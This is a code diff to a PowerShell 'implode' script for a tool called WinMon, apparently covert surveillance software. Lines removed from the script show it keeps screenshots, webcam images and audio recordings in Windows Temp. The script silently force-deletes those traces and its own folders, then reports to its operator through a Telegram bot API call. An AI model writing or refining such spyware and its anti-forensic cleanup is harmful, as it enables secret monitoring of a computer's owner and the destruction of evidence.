@@ -123,13 +123,10 @@ if ("%[4]s" -ieq "C:/Program Files/WinMon") {
     Remove-Item -Path "%[4]s" -Recurse -Force -ErrorAction SilentlyContinue
 }
 
-# 3. Clean up all temporary files (screenshots, webcams, audio recordings, logs)
-Remove-Item -Path "C:\Windows\Temp\winmon_*" -Exclude "winmon_implode.ps1","winmon_update.ps1" -Force -Recurse -ErrorAction SilentlyContinue
+# 3. Clean up private WinMon working directory and legacy Windows\Temp leftovers
+Remove-Item -Path "$env:ProgramData\WinMon" -Recurse -Force -ErrorAction SilentlyContinue
+Remove-Item -Path "C:\Windows\Temp\winmon_*" -Force -Recurse -ErrorAction SilentlyContinue
 Remove-Item -Path "C:\Windows\Temp\helper_*" -Force -Recurse -ErrorAction SilentlyContinue
-Remove-Item -Path "C:\Windows\Temp\screenshot.jpg" -Force -ErrorAction SilentlyContinue
-Remove-Item -Path "C:\Windows\Temp\webcam.jpg" -Force -ErrorAction SilentlyContinue
-Remove-Item -Path "C:\Windows\Temp\record.gif" -Force -ErrorAction SilentlyContinue
-Remove-Item -Path "C:\Windows\Temp\audio.wav" -Force -ErrorAction SilentlyContinue
 
 $body = @{ chat_id = "%[5]d"; text = "WinMon service and all associated local files have been completely removed from this PC." }
 Invoke-RestMethod -Uri "https://api.telegram.org/bot%[6]s/sendMessage" -Method Post -Body $body
